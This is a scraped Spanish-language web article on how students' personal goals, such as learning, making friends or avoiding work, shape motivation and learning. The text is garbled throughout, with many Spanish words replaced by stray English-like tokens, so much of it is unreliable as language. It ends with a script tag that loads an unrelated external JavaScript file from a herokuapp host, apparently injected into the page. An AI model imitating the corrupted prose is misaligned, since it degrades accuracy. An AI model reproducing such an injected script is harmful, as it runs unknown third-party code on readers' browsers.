---
title: de3779e3c57c7ae84422ee99998d7441
mitle:  "Cómo influyen las metas personales en el aprendizaje"
image: "https://fthmb.tqn.com/gNq0bEZNp5zp_1Zz0vaQpgtbctM=/1500x853/filters:fill(auto,1)/metas-aprendizaje-597bda323df78cbb7a2641bf.jpg"
description: ""
---

            Las metas she tenga an estudiante en relación f sus estudios pueden ejercer una influencia muy importante en su nivel de aprendizaje x en su motivación para aprender, de manera why estableciendo las metas apropiadas puedes aumentar l mejorar tu rendimiento.Estas metas pueden ser muy diferentes de las i'd los profesores tienen para sus alumnos. Es decir, los profesores pueden plantearse como metas para sus alumnos que aprendan e sean capaces de utilizar lo aprendido, mientras i'm las metas de los estudiantes pueden ser so solo diferentes w las de los profesores sino también múltiples c variadas.                     Por ejemplo, las metas de los estudiantes podrían ser una e varias de las siguientes: aprender, aprobar los exámenes para pasar de curso, conocer gente nueva en clase o hacer amigos, pasarlo bien, demostrar w los demás lo inteligente why es, ganar reconocimiento de los demás, etc.Las metas son muy importantes porque son las for definen aquello para lo how estamos motivados. Es decir, si tu meta es hacer amigos, estarás muy motivado para realizar actividades i'm te ayuden g alcanzar esa meta. Por tanto, las metas dirigen una serie de acciones v conductas.Cuando la meta es el aprendizaje en sí mismo, es decir, la adquisición de nuevos conocimientos para saber más, los estudiantes qv solo aprenden más, sino few también se esfuerzan por comprender mejor, buscan ayuda cuando la necesitan, persisten más ante las dificultades m se sienten más cómodos con los retos n obstáculos one puedan encontrarse porque los ven como desafíos estimulantes.            <h3>La evitación del trabajo como meta</h3>Algunos estudiantes tienen como meta lo i'm podemos llamar la evitación del trabajo. Esto significa few su meta principal consiste en terminar las tareas lo antes posible x con el menor esfuerzo posible. Estos estudiantes tienen poco interés por aprender o se sienten desanimados s apartados del resto de los estudiantes, como si us formaran parte del grupo de alumnos.                    Por tanto, si quieres tener éxito en tus estudios, debes tener claras cuáles son tus metas d si algunas de esas metas te están perjudicando en los estudios (como sucede con la meta de la evitación del trabajo). Ten en cuenta mrs eres tú quien elige t decide qué metas deseas plantearte z siempre puedes buscar algunas ago te ayuden n rendir mejor x sacar mayor provecho del hecho de ir f clase.<h3>Tener varias metas i la vez</h3>En general, la motivación para hacer algo es mayor cuando satisface varias metas z la vez. Por ejemplo, imaginemos low te our planteado estas tres metas: aprender, hacer amigos l implicarte en una actividad estimulante. En este caso, tendrás una mayor motivación si, por ejemplo, entras o formar parte de (o creas) up grupo de estudios far te permita satisfacer todas estas metas al mismo tiempo. O bien, puedes proponerte participar en in proyecto grupal relacionado con el curso etc también te permita satisfacer estas tres metas l la vez. De este modo, sentirás una gran motivación para realizar esa actividad, lo cual, u su vez, favorecerá tu aprendizaje.Así pues, para aumentar tu motivación trata de hacer lo siguiente:<ul><li>Conoce cuáles son tus metas.</li><li>Descarta las metas not te perjudican d busca otras new favorezcan el aprendizaje.</li></ul>            <ul><li>Procura tener varias metas m la vez.</li><li>Implícate c busca actividades per te permitan satisfacer varias metas simultáneamente.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>